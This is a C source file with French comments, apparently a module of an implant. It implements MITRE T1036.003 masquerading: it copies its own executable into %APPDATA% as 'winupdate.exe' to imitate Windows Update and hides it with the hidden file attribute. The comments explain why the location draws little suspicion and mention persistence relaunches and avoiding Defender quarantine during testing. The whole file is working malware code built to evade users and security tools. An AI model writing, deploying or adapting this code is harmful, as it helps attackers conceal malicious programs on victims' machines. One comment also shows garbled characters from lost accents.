/*
 * masquerade.c — Copie de l'implant vers %APPDATA% sous un nom systeme
 *
 * Technique T1036.003 (Masquerading: Rename System Utilities) :
 * le binaire de l'implant est copie dans %APPDATA% sous le nom
 * "winupdate.exe", proche de Windows Update, puis masque avec
 * l'attribut FILE_ATTRIBUTE_HIDDEN pour echapper a un listing naive
 * de l'utilisateur.
 *
 * Pourquoi %APPDATA% : dossier inscriptible sans privilege, figure
 * dans le PATH utilisateur par defaut sur de nombreux postes, et
 * frequement utilise par des applications legitimes — presence moins
 * suspecte que %TEMP%.
 *
 * Semantique :
 *   masquerade_install() — copie l'exe courant. Idempotent : si la
 *       destination existe deja, elle est ecrasee (CopyFileA
 *       bFailIfExists = FALSE), l'attribut cache est reapplique.
 *   masquerade_remove()  — supprime la copie. Si elle est absente,
 *       retourne 0 (rien a faire).
 *   masquerade_is_installed() — 1 si la copie est presente, 0 sinon.
 *
 * Erreurs : -1 si l'API Win32 echoue (chemin trop long, source
 * illisible, supprime impossible). Le detail est dans GetLastError.
 */

#include <windows.h>

#include <stdio.h>
#include <string.h>

#include "masquerade.h"

/* Nom systeme imite (T1036.003). Surchargeable en banc de test :
 * un nom neutre evite la mise en quarantaine par Defender de la
 * machine de DEV pendant les essais (voir PR). */
#ifndef DEST_NAME
#define DEST_NAME "winupdate.exe"
#endif

/* Construit le chemin de destination dans dest (deja dimensionne
 * MAX_PATH par l'appelant) a partir de %APPDATA%. Retourne la
 * longueur, ou 0 si echec/buf trop petit. */
static DWORD build_dest_path(char *dest, DWORD dest_sz) {
    char appdata[MAX_PATH];
    DWORD n = GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));

    /* n = taille utile de APPDATA ; 0 = variable absente.
     * n >= sizeof -> la valeur ne tient pas dans appdata : trop long. */
    if (n == 0 || n >= sizeof(appdata))
        return 0;

    int w = snprintf(dest, dest_sz, "%s\\%s", appdata, DEST_NAME);
    if (w < 0 || (DWORD)w >= dest_sz)
        return 0;
    return (DWORD)w;
}

int masquerade_dest_path(char *buf, size_t buf_sz) {
    return (build_dest_path(buf, (DWORD)buf_sz) != 0) ? 0 : -1;
}

int masquerade_install(void) {
    char self[MAX_PATH] = {0};
    char dest[MAX_PATH] = {0};

    DWORD slen = GetModuleFileNameA(NULL, self, sizeof(self));
    /* slen == sizeof(self) -> chemin tronque : refuser plutot que
     * copier depuis un chemin invalide. */
    if (slen == 0 || slen >= sizeof(self))
        return -1;

    if (build_dest_path(dest, sizeof(dest)) == 0)
        return -1;

    /* Cas limite : l'exe tourne deja depuis %APPDATA% (relance de la
     * persistance). Copier sur soi-meme echouerait ; il n'y a rien
     * a faire, la mise en place est deja effective. */
    if (_stricmp(self, dest) == 0)
        return 0;

    /* Un fichier cach ne peut pas tre cras par CopyFileA (ERROR_ACCESS_DENIED) :
     * retirer l'attribut avant d'craser, sinon le 2e install choue. */
    DWORD dattrs = GetFileAttributesA(dest);
    if (dattrs != INVALID_FILE_ATTRIBUTES && (dattrs & FILE_ATTRIBUTE_HIDDEN))
        if (!SetFileAttributesA(dest, FILE_ATTRIBUTE_NORMAL))
            return -1;

    /* bFailIfExists = FALSE -> ecrase une copie precedente :
     * l'operation reste idempotente apres une mise a jour du binaire. */
    if (!CopyFileA(self, dest, FALSE))
        return -1;

    /* Attribut cache — applique systematiquement, y compris sur
     * reecriture (un ecrasement ne conserve pas l'attribut). */
    if (!SetFileAttributesA(dest, FILE_ATTRIBUTE_HIDDEN))
        return -1;

    return 0;
}

int masquerade_remove(void) {
    char dest[MAX_PATH] = {0};

    if (build_dest_path(dest, sizeof(dest)) == 0)
        return -1;

    /* Efface d'abord l'attribut cache sinon DeleteFileA peut echouer
     * sur un fichier ouvert/liste avec FILE_ATTRIBUTE_HIDDEN. */
    DWORD attrs = GetFileAttributesA(dest);
    if (attrs == INVALID_FILE_ATTRIBUTES)
        return 0; /* copie absente -> rien a faire */

    if (attrs & FILE_ATTRIBUTE_HIDDEN)
        if (!SetFileAttributesA(dest, FILE_ATTRIBUTE_NORMAL))
            return -1;

    if (!DeleteFileA(dest))
        return -1;

    return 0;
}

int masquerade_is_installed(void) {
    char dest[MAX_PATH] = {0};

    if (build_dest_path(dest, sizeof(dest)) == 0)
        return 0;

    return GetFileAttributesA(dest) != INVALID_FILE_ATTRIBUTES;
}
